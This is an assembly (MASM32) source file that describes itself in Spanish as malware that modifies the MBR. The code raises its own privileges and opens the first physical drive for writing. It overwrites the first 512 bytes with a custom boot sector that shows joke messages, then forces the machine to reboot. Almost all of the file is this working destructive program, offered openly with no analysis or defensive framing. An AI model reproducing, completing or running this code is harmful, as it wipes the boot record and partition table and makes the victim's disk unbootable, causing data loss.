;
;
;       Malware que modifica el MBR
;       este malware tiene que ocupar menos de 
;       8 KB, y ya la inyección son 512 bytes
;
.486
.model flat, stdcall
option casemap :none

include \MASM32\INCLUDE\user32.inc
include \MASM32\INCLUDE\kernel32.inc
include \MASM32\INCLUDE\windows.inc
include \MASM32\INCLUDE\ntdll.inc



includelib \MASM32\LIB\user32.lib
includelib \MASM32\LIB\Kernel32.lib
includelib \MASM32\LIB\ntdll.lib



; Algunas MACROS
SE_DEBUG_PRIVILEGE      EQU     20
SE_SHUTDOWN_PRIVILEGE   EQU     19
NOT_ADMIN               EQU     0C0000061h

.data

        chiquito   db 0E9h,00h,00h,0E8h,21h,00h,8Ch,0C8h,8Eh,0D8h,0BEh,36h,7Ch,0E8h,00h,00h,50h,0FCh,8Ah,04h
           db 3Ch,00h,74h,07h,0E8h,07h,00h,46h,0E9h,0F3h,0FFh,0E9h,0FDh,0FFh,0B4h,0Eh,0CDh,10h,0C3h,0B4h
           db 07h,0B0h,00h,0B7h,4Fh,0B9h,00h,00h,0BAh,4Fh,18h,0CDh,10h,0C3h,22h,50h,65h,63h,61h,64h
           db 6Fh,72h,21h,22h,2Eh,13h,10h,22h,0BFh,54h,65h,20h,64h,61h,20h,63h,75h,65h,6Eh,3Fh
           db 22h,2Eh,13h,10h,22h,54h,65h,6Eh,20h,63h,75h,69h,64h,61h,64h,0EDh,6Eh,6Eh,6Eh,20h
           db 6Eh,6Fh,20h,74h,65h,20h,68h,61h,67h,61h,73h,20h,70h,75h,70h,69h,74h,61h,20h,65h
           db 6Eh,20h,65h,6Ch,20h,66h,69h,73h,74h,72h,6Fh,20h,64h,75h,6Fh,64h,65h,6Eh,61h,6Ch
           db 6Ch,6Ch,21h,22h,2Eh,13h,10h,22h,53h,69h,65h,74h,65h,65h,65h,20h,63h,61h,62h,61h
           db 6Ch,6Ch,6Fh,20h,71h,75h,65h,20h,76h,69h,65h,6Eh,65h,6Eh,6Eh,6Eh,20h,64h,65h,20h
          db 42h,6Fh,6Eh,61h,6Eh,7Ah,61h,61h,61h,72h,72h,6Ch,6Ch,6Ch,22h,2Eh,13h,10h,22h,41h
          db 73h,65h,78h,73h,75h,61h,72h,72h,72h,21h,22h,2Eh,13h,10h,22h,45h,72h,65h,73h,20h
          db 6Dh,0E1h,73h,20h,66h,65h,6Fh,20h,71h,75h,65h,20h,65h,6Ch,20h,46h,61h,72h,69h,20h
          db 63h,6Fh,6Dh,69h,65h,6Eh,64h,6Fh,20h,6Ch,69h,6Dh,6Fh,6Eh,65h,73h,22h,13h,10h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,00h
          db 00h,00h,00h,00h,00h,00h,00h,00h,00h,00h,55h,0AAh
        bytes_written dw 0
        MBR         db '\\.\PhysicalDrive0',0
        Previous_value      dd  0

.code

start:

    xor ebx,ebx
    
    push offset Previous_value
    push ebx
    push TRUE
    push SE_DEBUG_PRIVILEGE
    call RtlAdjustPrivilege

    cmp eax,NOT_ADMIN
    jz finalizar
    
    mov ecx,3
    push ebx ; valor mas a la derecha
    push ebx ; siguiente
    push OPEN_EXISTING ; abrir archivo ya existente
    push ebx ; NULL
    push ecx ; valor 3
    push GENERIC_ALL
    push offset MBR
    call CreateFileA

    ; Ahora en eax tenemos el handler en eax


    ; Vamos ahora con WriteFile
    push ebx ; 0
    push offset bytes_written ; NumberOfBytesWriten
    push 512 ; NumberOfBytesToWrite
    push offset chiquito ; bytes to write
    push eax ; handler archivo
    call WriteFile

    ; Obtener los privilegios de apagado
    push offset Previous_value
    push ebx
    push TRUE
    push SE_SHUTDOWN_PRIVILEGE
    call RtlAdjustPrivilege

    cmp eax, NOT_ADMIN
    jz finalizar

    push EWX_FORCE
    push EWX_REBOOT
    call ExitWindowsEx
    

finalizar:  
    push ebx
    call ExitProcess

end start
